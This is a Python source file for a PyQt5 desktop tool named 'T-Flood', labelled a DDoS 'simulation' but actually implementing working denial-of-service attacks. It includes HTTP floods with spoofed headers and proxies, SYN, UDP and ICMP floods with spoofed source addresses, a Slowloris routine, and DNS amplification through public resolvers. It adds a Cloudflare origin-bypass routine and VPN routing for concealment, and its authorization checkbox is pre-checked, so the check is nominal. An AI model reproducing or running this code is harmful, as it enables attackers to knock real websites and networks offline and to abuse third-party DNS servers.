import sys
import threading
import time
import random
import socket
from datetime import datetime
from PyQt5.QtCore import Qt, QTimer, pyqtSignal, QObject
from PyQt5.QtGui import QPixmap, QIcon, QColor, QTextCharFormat, QTextCursor
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QLabel, QSplashScreen, QWidget, QVBoxLayout,
    QLineEdit, QPushButton, QComboBox, QSpinBox, QTextEdit, QMessageBox,
    QGroupBox, QFormLayout, QHBoxLayout, QGraphicsDropShadowEffect, QCheckBox
)
import os
import requests
from scapy.all import IP, TCP, UDP, send, DNS, DNSQR, Raw, ICMP
import struct
import subprocess
import json
import re
from fake_useragent import UserAgent

# VPN Configuration
class VPNManager:
    def __init__(self):
        self.current_vpn = None
        self.vpn_configs = self._load_vpn_configs()
        
    def _load_vpn_configs(self):
        try:
            with open('vpn_configs.json') as f:
                return json.load(f)
        except:
            return {
                "nordvpn": {
                    "connect": "nordvpn connect {country}",
                    "disconnect": "nordvpn disconnect",
                    "status": "nordvpn status"
                },
                "protonvpn": {
                    "connect": "protonvpn-cli connect --cc {country}",
                    "disconnect": "protonvpn-cli disconnect",
                    "status": "protonvpn-cli status"
                }
            }
    
    def connect_vpn(self, provider, country=None):
        try:
            cmd = self.vpn_configs[provider.lower()]['connect'].format(country=country or '')
            result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
            self.current_vpn = provider
            return True, result.stdout
        except subprocess.CalledProcessError as e:
            return False, e.stderr
    
    def disconnect_vpn(self):
        if not self.current_vpn:
            return False, "No active VPN"
        try:
            cmd = self.vpn_configs[self.current_vpn.lower()]['disconnect']
            result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
            self.current_vpn = None
            return True, result.stdout
        except subprocess.CalledProcessError as e:
            return False, e.stderr
    
    def get_status(self):
        if not self.current_vpn:
            return "No active VPN"
        try:
            cmd = self.vpn_configs[self.current_vpn.lower()]['status']
            result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            return f"Error getting status: {e.stderr}"

# Cloudflare Bypass Techniques
class CloudflareBypass:
    @staticmethod
    def get_real_ip(url):
        """Try to find origin server IP behind Cloudflare"""
        try:
            # Check common Cloudflare headers
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            resp = requests.head(url, headers=headers, timeout=5)
            
            if 'cloudflare' in resp.headers.get('server', '').lower():
                # Try DNS history lookup
                domain = url.split('//')[-1].split('/')[0]
                try:
                    import dns.resolver
                    answers = dns.resolver.resolve(domain, 'A')
                    for rdata in answers:
                        return str(rdata)
                except:
                    pass
                
                # Try common Cloudflare bypass techniques
                headers['X-Forwarded-For'] = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
                headers['CF-Connecting-IP'] = headers['X-Forwarded-For']
                resp = requests.get(url, headers=headers, timeout=5)
                
                if resp.status_code == 200:
                    # Try to find server IP in response
                    ip_pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
                    matches = re.findall(ip_pattern, resp.text)
                    if matches:
                        return matches[0]
        except Exception as e:
            pass
        return None

# Enhanced Simulation Worker
class SimulationWorker(QObject):
    log_signal = pyqtSignal(str, QColor)
    finished = pyqtSignal()
    vpn_status = pyqtSignal(str)

    def __init__(self, target, sim_type, threads, duration, pkt_size, src_port_min, src_port_max,
                 tcp_dst_port, http_timeout, packet_delay, amp_factor, dns_servers, max_pps,
                 use_vpn=False, vpn_provider=None, vpn_country=None, bypass_cf=False):
        super().__init__()
        self.target = target
        self.sim_type = sim_type
        self.threads = threads
        self.duration = duration
        self.pkt_size = pkt_size
        self.src_port_min = src_port_min
        self.src_port_max = src_port_max
        self.tcp_dst_port = tcp_dst_port
        self.http_timeout = http_timeout
        self.packet_delay = packet_delay
        self.amp_factor = amp_factor
        self.dns_servers = [s.strip() for s in dns_servers.split(',')] if dns_servers else []
        self.max_pps = max_pps
        self.use_vpn = use_vpn
        self.vpn_provider = vpn_provider
        self.vpn_country = vpn_country
        self.bypass_cf = bypass_cf
        self._running = True
        self._ip = None
        self._port = None
        self._real_ip = None
        self.vpn_manager = VPNManager()
        self.cf_bypass = CloudflareBypass()
        self.ua = UserAgent()
        
        # Pre-build packet templates for performance
        self.syn_template = IP()/TCP(flags='S')
        self.udp_template = IP()/UDP()/Raw(load=os.urandom(1024))
        self.icmp_template = IP()/ICMP()/Raw(load=os.urandom(64))
        
        # Cloudflare bypass cache
        self.cf_cache = {}
        
        # Enhanced headers for HTTP attacks
        self.http_headers = [
            {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.5',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Pragma': 'no-cache',
                'Upgrade-Insecure-Requests': '1'
            },
            {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Pragma': 'no-cache'
            }
        ]

    def _log(self, message, color=QColor('white')):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_signal.emit(f"[{timestamp}] {message}", color)

    def _resolve_target(self):
        try:
            # Handle URL targets (http/https)
            if self.target.startswith(("http://", "https://")):
                from urllib.parse import urlparse
                parsed = urlparse(self.target)
                hostname = parsed.hostname
                
                # Remove port from hostname if present
                if ':' in hostname:
                    hostname = hostname.split(':')[0]
                
                # Try Cloudflare bypass if enabled
                if self.bypass_cf:
                    self._real_ip = self.cf_bypass.get_real_ip(self.target)
                    if self._real_ip:
                        self._log(f"[CF-BYPASS] Found real IP: {self._real_ip}", QColor('cyan'))
                        self._ip = self._real_ip
                    else:
                        self._ip = socket.gethostbyname(hostname)
                        self._log(f"[WARNING] Could not bypass Cloudflare, using frontend IP: {self._ip}", QColor('yellow'))
                else:
                    self._ip = socket.gethostbyname(hostname)
                
                self._port = parsed.port if parsed.port else (443 if parsed.scheme == 'https' else 80)
                self._log(f"Resolved {hostname} to {self._ip}:{self._port}", QColor('lightgreen'))
                return True
                
            # Handle IP:PORT format
            elif ':' in self.target:
                parts = self.target.split(':')
                self._ip = parts[0]
                try:
                    self._port = int(parts[1])
                    self._log(f"Using target {self._ip}:{self._port}", QColor('lightgreen'))
                    return True
                except (IndexError, ValueError):
                    self._port = 80
                    self._log(f"Using target {self._ip}:{self._port} (default port)", QColor('lightgreen'))
                    return True
                    
            # Handle plain IP address
            else:
                self._ip = self.target
                self._port = self.tcp_dst_port if self.sim_type == "SYN Flooding" else 80
                self._log(f"Using target {self._ip}:{self._port}", QColor('lightgreen'))
                return True
                
        except socket.gaierror:
            self._log(f"[!] Could not resolve hostname: {self.target}", QColor('red'))
            return False
        except Exception as e:
            self._log(f"[!] Target resolution error: {str(e)}", QColor('red'))
            return False
    def _setup_vpn(self):
        if not self.use_vpn:
            self._log("VPN not enabled, proceeding without VPN", QColor('yellow'))
            return True  # Continue without VPN
            
        self._log(f"Connecting to {self.vpn_provider} VPN ({self.vpn_country})...", QColor('blue'))
        success, message = self.vpn_manager.connect_vpn(self.vpn_provider, self.vpn_country)
        if success:
            self._log(f"VPN Connected: {message}", QColor('lightgreen'))
            self.vpn_status.emit(self.vpn_manager.get_status())
            return True
        else:
            # Instead of failing, just continue without VPN but warn the user
            self._log(f"VPN Connection Failed: {message} - Continuing without VPN", QColor('red'))
            self.vpn_status.emit("VPN Failed - Continuing without VPN")
            return True  # Still return True to continue the attack

    def run(self):
        # Setup VPN if enabled (but continue even if it fails)
        self._setup_vpn()

        # Resolve target
        if not self._resolve_target():
            self._log("[!] Invalid target, aborting attack.", QColor('red'))
            self.finished.emit()
            return

        # Rest of the run method remains the same...
        self._log(f"Starting {self.sim_type} on {self._ip}:{self._port} with {self.threads} threads for {self.duration}s.", QColor('lightblue'))
        start_time = time.time()
        threads = []
        
        # Start kill switch timer
        kill_timer = threading.Timer(self.duration, self.stop)
        kill_timer.start()

        # Create threads based on attack type
        if self.sim_type == "Combined Attack":
            for _ in range(self.threads):
                t1 = threading.Thread(target=self._http_flood)
                t2 = threading.Thread(target=self._syn_flood)
                t3 = threading.Thread(target=self._udp_flood)
                t4 = threading.Thread(target=self._icmp_flood)
                threads.extend([t1, t2, t3, t4])
        else:
            for _ in range(self.threads):
                if self.sim_type == "HTTP Load":
                    t = threading.Thread(target=self._http_flood)
                elif self.sim_type == "SYN Flooding":
                    t = threading.Thread(target=self._syn_flood)
                elif self.sim_type == "UDP Load":
                    t = threading.Thread(target=self._udp_flood)
                elif self.sim_type == "Slow HTTP":
                    t = threading.Thread(target=self._slow_http)
                elif self.sim_type == "DNS Amplification":
                    t = threading.Thread(target=self._dns_amplification)
                elif self.sim_type == "ICMP Flood":
                    t = threading.Thread(target=self._icmp_flood)
                else:
                    self._log("[!] Unknown attack type.", QColor('red'))
                    self.finished.emit()
                    return
                t.daemon = True
                threads.append(t)

        # Start all threads
        for t in threads:
            t.start()

        # Monitor attack duration
        while self._running and (time.time() - start_time) < self.duration:
            time.sleep(1)
            elapsed = int(time.time() - start_time)
            self._log(f"Attack running... {elapsed}/{self.duration} seconds", QColor('yellow'))

        self._running = False
        for t in threads:
            t.join(timeout=1)
            
        kill_timer.cancel()

        # Disconnect VPN if enabled
        if self.use_vpn:
            success, message = self.vpn_manager.disconnect_vpn()
            if success:
                self._log(f"VPN Disconnected: {message}", QColor('lightgreen'))
            else:
                self._log(f"VPN Disconnection Failed: {message}", QColor('red'))

        self._log("[*] Attack finished.", QColor('lightgreen'))
        self.finished.emit()

    def stop(self):
        self._running = False

    def _http_flood(self):
        # Load proxies from file
        try:
            with open('./proxies.txt', 'r') as f:
                proxy_list = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self._log("[HTTP] proxies.txt not found. Running without proxy support.", QColor('orange'))
            proxy_list = []

        url_base = self.target if self.target.endswith('/') else self.target + "/"
        target_ip = self._real_ip if self._real_ip else self._ip
        host_header = self.target.split('//')[-1].split('/')[0]

        while self._running:
            try:
                # Randomize headers from templates
                headers = random.choice(self.http_headers).copy()
                headers.update({
                    'User-Agent': self.ua.random,
                    'Referer': random.choice([
                        'https://google.com',
                        'https://youtube.com',
                        url_base
                    ]),
                    'X-Forwarded-For': socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff))),
                    'CF-Connecting-IP': socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff))),
                    'Host': host_header
                })

                # Build dynamic URL to avoid caching
                full_url = f"{url_base}?v={random.randint(100000,999999)}"

                # Random proxy
                proxies = None
                if proxy_list:
                    proxy = random.choice(proxy_list)
                    proxies = {"http": proxy, "https": proxy}

                # Target either Cloudflare frontend or origin server directly
                target_url = full_url
                if self._real_ip:
                    target_url = full_url.replace(host_header, self._real_ip)
                    headers['Host'] = host_header  # Keep original host header

                # Send request
                response = requests.get(
                    target_url,
                    headers=headers,
                    proxies=proxies,
                    timeout=self.http_timeout,
                    verify=False  # Bypass SSL verification for performance
                )

                # Cloudflare/WAF block detection
                status = response.status_code
                if status in [403, 429, 503]:
                    self._log(f"[WAF] Blocked or throttled with status {status}", QColor('red'))
                elif status == 200:
                    self._log(f"[HTTP] {status} OK from {full_url}", QColor('lightblue'))
                else:
                    self._log(f"[HTTP] {status} from {full_url}", QColor('yellow'))

                # Optional delay
                if self.packet_delay > 0:
                    time.sleep(self.packet_delay)
            except Exception as e:
                self._log(f"[HTTP] Error: {str(e)[:100]}", QColor('red'))
                time.sleep(0.5)

    def _syn_flood(self):
        pps_counter = 0
        pps_start = time.time()
        
        while self._running:
            try:
                # Use pre-built template for performance
                pkt = self.syn_template.copy()
                pkt[IP].dst = self._ip
                pkt[IP].src = self._generate_spoofed_ip()
                pkt[TCP].sport = random.randint(self.src_port_min, self.src_port_max)
                pkt[TCP].dport = self.tcp_dst_port
                pkt[TCP].seq = random.randint(0, 0xffffffff)
                send(pkt, verbose=False)
                
                # Rate limiting
                pps_counter += 1
                if time.time() - pps_start >= 1:
                    if pps_counter > self.max_pps:
                        time.sleep(0.01)  # Throttle if exceeding max PPS
                    pps_counter = 0
                    pps_start = time.time()
                
                if self.packet_delay > 0:
                    time.sleep(self.packet_delay)
            except Exception as e:
                self._log(f"[SYN] Error: {e}", QColor('red'))

    def _udp_flood(self):
        pps_counter = 0
        pps_start = time.time()
        
        while self._running:
            try:
                # Use pre-built template for performance
                pkt = self.udp_template.copy()
                pkt[IP].dst = self._ip
                pkt[IP].src = self._generate_spoofed_ip()
                pkt[UDP].sport = random.randint(self.src_port_min, self.src_port_max)
                pkt[UDP].dport = self._port
                pkt[Raw].load = os.urandom(self.pkt_size)
                send(pkt, verbose=False)
                
                # Rate limiting
                pps_counter += 1
                if time.time() - pps_start >= 1:
                    if pps_counter > self.max_pps:
                        time.sleep(0.01)  # Throttle if exceeding max PPS
                    pps_counter = 0
                    pps_start = time.time()
                
                if self.packet_delay > 0:
                    time.sleep(self.packet_delay)
            except Exception as e:
                self._log(f"[UDP] Error: {e}", QColor('red'))
    
    def _icmp_flood(self):
        """ICMP flood attack (Ping of Death style)"""
        pps_counter = 0
        pps_start = time.time()
        
        while self._running:
            try:
                pkt = self.icmp_template.copy()
                pkt[IP].dst = self._ip
                pkt[IP].src = self._generate_spoofed_ip()
                pkt[ICMP].type = 8  # Echo request
                pkt[ICMP].id = random.randint(0, 0xffff)
                pkt[ICMP].seq = random.randint(0, 0xffff)
                pkt[Raw].load = os.urandom(self.pkt_size)
                send(pkt, verbose=False)
                
                # Rate limiting
                pps_counter += 1
                if time.time() - pps_start >= 1:
                    if pps_counter > self.max_pps:
                        time.sleep(0.01)
                    pps_counter = 0
                    pps_start = time.time()
                
                if self.packet_delay > 0:
                    time.sleep(self.packet_delay)
            except Exception as e:
                self._log(f"[ICMP] Error: {e}", QColor('red'))
    
    def _slow_http(self):
        """Enhanced Slowloris-style attack with more headers"""
        while self._running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self._ip, self._port))
                
                # Initial request
                s.send(f"GET /?{random.randint(0,1000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.target.split('//')[-1].split('/')[0]}\r\n".encode())
                
                # Partial headers to keep connection open
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                s.send("Accept: text/html,application/xhtml+xml\r\n".encode())
                s.send("Accept-Language: en-US,en;q=0.9\r\n".encode())
                s.send("Connection: keep-alive\r\n".encode())
                s.send("Content-Length: 90000\r\n".encode())
                
                # Keep connection alive with periodic headers
                while self._running:
                    s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                    time.sleep(random.randint(10, 30))  # Random interval
            except Exception as e:
                self._log(f"[SLOW] Error: {e}", QColor('red'))
                time.sleep(1)
    
    def _dns_amplification(self):
        """Enhanced DNS amplification attack with larger queries"""
        pps_counter = 0
        pps_start = time.time()
        
        # Larger DNS query domains that typically return big responses
        large_domains = [
            "isc.org",  # Typically returns large TXT records
            "ripe.net",  # Large organizational records
            "cloudflare.com",
            "google.com",
            "example.com"
        ]
        
        while self._running:
            try:
                # Select a random DNS server
                if not self.dns_servers:
                    self._log("[DNS] No DNS servers configured", QColor('red'))
                    time.sleep(1)
                    continue
                    
                dns_server = random.choice(self.dns_servers).strip()
                domain = random.choice(large_domains)
                
                # Create DNS query for a large TXT record
                ip_layer = IP(dst=dns_server, src=self._generate_spoofed_ip())
                udp_layer = UDP(sport=random.randint(1024, 65535), dport=53)
                dns_query = DNS(rd=1, qd=DNSQR(qname=domain, qtype="TXT", qclass="IN"))
                packet = ip_layer / udp_layer / dns_query
                send(packet, verbose=False)
                
                self._log(f"[DNS] Sent amplification request for {domain} to {dns_server}")
                
                # Rate limiting
                pps_counter += 1
                if time.time() - pps_start >= 1:
                    if pps_counter > self.max_pps:
                        time.sleep(0.01)
                    pps_counter = 0
                    pps_start = time.time()
                
                if self.packet_delay > 0:
                    time.sleep(self.packet_delay)
            except Exception as e:
                self._log(f"[DNS] Error: {e}", QColor('red'))
    
    def _generate_spoofed_ip(self):
        """Generate a random IP address for spoofing with some realistic distributions"""
        # 60% chance of generating from common private ranges
        if random.random() < 0.6:
            return socket.inet_ntoa(struct.pack('>I', random.choice([
                random.randint(0x0A000000, 0x0AFFFFFF),  # 10.0.0.0/8
                random.randint(0xAC100000, 0xAC1FFFFF),  # 172.16.0.0/12
                random.randint(0xC0A80000, 0xC0A8FFFF)   # 192.168.0.0/16
            ])))
        else:
            return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xFFFFFFFE)))


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("T-Flood : Advanced DDoS Attack Simulation - By AMAIRA SAFWEN")
        self.setGeometry(400, 200, 900, 950)
        self.setStyleSheet("""
            QWidget {
                background-color: #121212;
                color: #ffffff;
                font-family: 'Segoe UI';
                font-size: 12pt;
            }
            QGroupBox {
                border: 1px solid #444;
                border-radius: 10px;
                margin-top: 20px;
                padding-top: 30px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 3px 0 3px;
                color: #ff4c4c;
                font-weight: bold;
                font-size: 14pt;
            }
            QLineEdit, QComboBox, QSpinBox, QLabel {
                background-color: #1e1e1e;
                border: 1px solid #333;
                border-radius: 6px;
                padding: 6px;
                color: #ddd;
                font-size: 11pt;
            }
            QTextEdit {
                background-color: #1e1e1e;
                border: 1px solid #333;
                color: #ccc;
                padding: 10px;
                border-radius: 6px;
                font-family: 'Courier New';
                font-size: 11pt;
            }
            QPushButton {
                font-weight: bold;
                border-radius: 10px;
                padding: 12px 30px;
            }
            QCheckBox {
                spacing: 8px;
            }
            QCheckBox::indicator {
                width: 20px;
                height: 20px;
            }
        """)

        self.worker = None
        self.worker_thread = None
        self.init_ui()

    def init_ui(self):
        central_widget = QWidget()
        layout = QVBoxLayout()
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)

        # Attack Settings group
        attack_group = QGroupBox("Attack Settings")
        attack_form = QFormLayout()

        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("Target (https://example.com or 192.168.1.1)")
        attack_form.addRow("Target:", self.target_input)

        self.sim_type = QComboBox()
        self.sim_type.addItems(["HTTP Load", "SYN Flooding", "UDP Load", 
                               "Slow HTTP", "DNS Amplification", "ICMP Flood", "Combined Attack"])
        attack_form.addRow("Flooding Type:", self.sim_type)

        self.threads = QSpinBox()
        self.threads.setRange(1, 1000)
        self.threads.setValue(100)
        attack_form.addRow("Threads:", self.threads)

        self.duration = QSpinBox()
        self.duration.setRange(1, 86400)  # Up to 24 hours
        self.duration.setValue(300)
        self.duration.setSuffix(" seconds")
        attack_form.addRow("Duration:", self.duration)

        attack_group.setLayout(attack_form)

        # VPN Settings group
        vpn_group = QGroupBox("VPN Configuration")
        vpn_layout = QFormLayout()

        self.use_vpn = QCheckBox("Enable VPN Routing")
        self.use_vpn.setChecked(False)
        vpn_layout.addRow(self.use_vpn)

        self.vpn_provider = QComboBox()
        self.vpn_provider.addItems(["nordvpn", "protonvpn", "custom"])
        vpn_layout.addRow("VPN Provider:", self.vpn_provider)

        self.vpn_country = QLineEdit()
        self.vpn_country.setPlaceholderText("Country code (us, uk, etc.) or leave blank")
        vpn_layout.addRow("VPN Country:", self.vpn_country)

        self.bypass_cf = QCheckBox("Attempt Cloudflare Bypass")
        self.bypass_cf.setChecked(True)
        self.bypass_cf.setToolTip("Try to find origin server IP behind Cloudflare protection")
        vpn_layout.addRow(self.bypass_cf)

        vpn_group.setLayout(vpn_layout)

        # Advanced parameters group
        advanced_group = QGroupBox("Advanced Parameters")
        advanced_form = QFormLayout()

        self.pkt_size = QSpinBox()
        self.pkt_size.setRange(64, 65500)
        self.pkt_size.setValue(1024)
        self.pkt_size.setToolTip("Size in bytes of UDP/ICMP packets")
        advanced_form.addRow("Packet Size (bytes):", self.pkt_size)

        port_range_layout = QHBoxLayout()
        self.src_port_min = QSpinBox()
        self.src_port_min.setRange(1024, 65500)
        self.src_port_min.setValue(1024)
        self.src_port_max = QSpinBox()
        self.src_port_max.setRange(1024, 65535)
        self.src_port_max.setValue(65535)
        port_range_layout.addWidget(self.src_port_min)
        port_range_layout.addWidget(QLabel("to"))
        port_range_layout.addWidget(self.src_port_max)
        advanced_form.addRow("Source Port Range:", port_range_layout)

        self.tcp_dst_port = QSpinBox()
        self.tcp_dst_port.setRange(1, 65535)
        self.tcp_dst_port.setValue(80)
        self.tcp_dst_port.setToolTip("TCP destination port used during SYN Flood attacks.")
        advanced_form.addRow("TCP Destination Port:", self.tcp_dst_port)

        self.http_timeout = QSpinBox()
        self.http_timeout.setRange(1, 30)
        self.http_timeout.setValue(5)
        self.http_timeout.setSuffix(" seconds")
        advanced_form.addRow("HTTP Timeout:", self.http_timeout)

        self.packet_delay = QSpinBox()
        self.packet_delay.setRange(0, 1000)
        self.packet_delay.setValue(0)
        self.packet_delay.setSuffix(" ms delay")
        advanced_form.addRow("Packet Delay:", self.packet_delay)
        
        # DNS Amplification settings
        self.amp_factor = QSpinBox()
        self.amp_factor.setRange(1, 100)
        self.amp_factor.setValue(50)
        self.amp_factor.setToolTip("Amplification factor for DNS attacks (50x typical)")
        advanced_form.addRow("DNS Amplification Factor:", self.amp_factor)
        
        self.dns_servers = QLineEdit("8.8.8.8, 1.1.1.1, 9.9.9.9")
        self.dns_servers.setToolTip("Comma-separated list of DNS servers for amplification attacks")
        advanced_form.addRow("DNS Servers:", self.dns_servers)
        
        # Rate limiting
        self.max_pps = QSpinBox()
        self.max_pps.setRange(1, 100000)
        self.max_pps.setValue(5000)
        self.max_pps.setSuffix(" packets per second")
        self.max_pps.setToolTip("Maximum packets per second per thread")
        advanced_form.addRow("Max PPS:", self.max_pps)

        advanced_group.setLayout(advanced_form)

        layout.addWidget(attack_group)
        layout.addWidget(vpn_group)
        layout.addWidget(advanced_group)
        
        # Legal disclaimer
        legal_layout = QHBoxLayout()
        self.legal_check = QCheckBox("I have authorization to test the target system")
        self.legal_check.setStyleSheet("color: #ff6666; font-weight: bold;")
        self.legal_check.setChecked(True)
        legal_layout.addWidget(self.legal_check)
        layout.addLayout(legal_layout)

        # Buttons
        button_layout = QHBoxLayout()

        self.start_btn = QPushButton("Start Attack")
        self.start_btn.setObjectName("startBtn")
        self._style_button(self.start_btn, "#1e90ff")
        self.start_btn.clicked.connect(self.start_simulation)

        self.stop_btn = QPushButton("Stop Attack")
        self.stop_btn.setObjectName("stopBtn")
        self._style_button(self.stop_btn, "#d9534f")
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self.stop_simulation)

        button_layout.addWidget(self.start_btn)
        button_layout.addWidget(self.stop_btn)
        layout.addLayout(button_layout)

        # Log area
        log_box = QGroupBox("Attack Logs")
        log_layout = QVBoxLayout()

        self.logs = QTextEdit()
        self.logs.setReadOnly(True)
        log_layout.addWidget(self.logs)
        
        # Status bar
        self.status_bar = QLabel("Ready")
        self.status_bar.setStyleSheet("color: #aaa; font-size: 10pt;")
        log_layout.addWidget(self.status_bar)
        
        log_box.setLayout(log_layout)

        layout.addWidget(log_box)
        central_widget.setLayout(layout)
        self.setCentralWidget(central_widget)

        # Connect combo box to enable/disable specific inputs
        self.sim_type.currentTextChanged.connect(self.on_sim_type_changed)
        self.on_sim_type_changed(self.sim_type.currentText())

    def update_status(self, status):
        """Update the status bar with VPN information"""
        self.status_bar.setText(f"Status: {status}")
        
    def on_sim_type_changed(self, text):
        # Enable/disable controls based on attack type
        self.tcp_dst_port.setEnabled(text in ["SYN Flooding", "Combined Attack"])
        self.pkt_size.setEnabled(text in ["UDP Load", "ICMP Flood", "Combined Attack"])
        self.amp_factor.setEnabled(text == "DNS Amplification")
        self.dns_servers.setEnabled(text == "DNS Amplification")

    def _style_button(self, btn, color_hex):
        color = QColor(color_hex)
        btn.setStyleSheet(f"""
            QPushButton#{btn.objectName()} {{
                background-color: {color.name()};
                color: white;
            }}
            QPushButton#{btn.objectName()}:hover:!disabled {{
                background-color: {color.lighter(130).name()};
            }}
            QPushButton#{btn.objectName()}:disabled {{
                background-color: #555;
            }}
        """)
        shadow = QGraphicsDropShadowEffect()
        shadow.setBlurRadius(20)
        shadow.setColor(color)
        shadow.setOffset(0, 0)
        btn.setGraphicsEffect(shadow)
    def start_simulation(self):
        # Legal compliance check
        if not self.legal_check.isChecked():
            QMessageBox.critical(self, "Legal Requirement", 
                "You must confirm you have authorization to test the target system!")
            return
                
        target = self.target_input.text().strip()
        if not target:
            QMessageBox.warning(self, "Input Error", "Please enter a valid target.")
            return
            
        # Validate target format
        if not (target.startswith(('http://', 'https://')) or 
                re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d+)?$', target)):
            QMessageBox.warning(self, "Input Error", 
                "Target must be a valid URL (http://example.com) or IP (1.2.3.4) with optional port (1.2.3.4:80)")
            return

        if self.worker_thread and self.worker_thread.is_alive():
            QMessageBox.warning(self, "Attack Running", "An attack is already running.")
            return

        # Validate port ranges
        if self.src_port_min.value() > self.src_port_max.value():
            QMessageBox.warning(self, "Input Error", "Source Port Min cannot be greater than Source Port Max.")
            return

        self.logs.clear()
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)

        delay_sec = self.packet_delay.value() / 1000

        self.worker = SimulationWorker(
            target=target,
            sim_type=self.sim_type.currentText(),
            threads=self.threads.value(),
            duration=self.duration.value(),
            pkt_size=self.pkt_size.value(),
            src_port_min=self.src_port_min.value(),
            src_port_max=self.src_port_max.value(),
            tcp_dst_port=self.tcp_dst_port.value(),
            http_timeout=self.http_timeout.value(),
            packet_delay=delay_sec,
            amp_factor=self.amp_factor.value(),
            dns_servers=self.dns_servers.text(),
            max_pps=self.max_pps.value(),
            use_vpn=self.use_vpn.isChecked(),
            vpn_provider=self.vpn_provider.currentText(),
            vpn_country=self.vpn_country.text(),
            bypass_cf=self.bypass_cf.isChecked()
        )
        self.worker.log_signal.connect(self.append_log)
        self.worker.finished.connect(self.simulation_finished)
        self.worker.vpn_status.connect(self.update_status)

        self.worker_thread = threading.Thread(target=self.worker.run)
        self.worker_thread.start()


    def stop_simulation(self):
        if self.worker:
            self.worker.stop()

    def append_log(self, message, color=QColor('white')):
        self.logs.moveCursor(QTextCursor.End)
        fmt = QTextCharFormat()
        fmt.setForeground(color)
        self.logs.setCurrentCharFormat(fmt)
        self.logs.append(message)
        self.logs.moveCursor(QTextCursor.End)

    def simulation_finished(self):
        self.append_log("[*] Attack finished.", QColor('lightgreen'))
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)


def main():
    app = QApplication(sys.argv)
    splash = QSplashScreen()
    splash.show()
    QTimer.singleShot(2000, splash.close)

    win = MainWindow()
    QTimer.singleShot(2000, win.show)
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()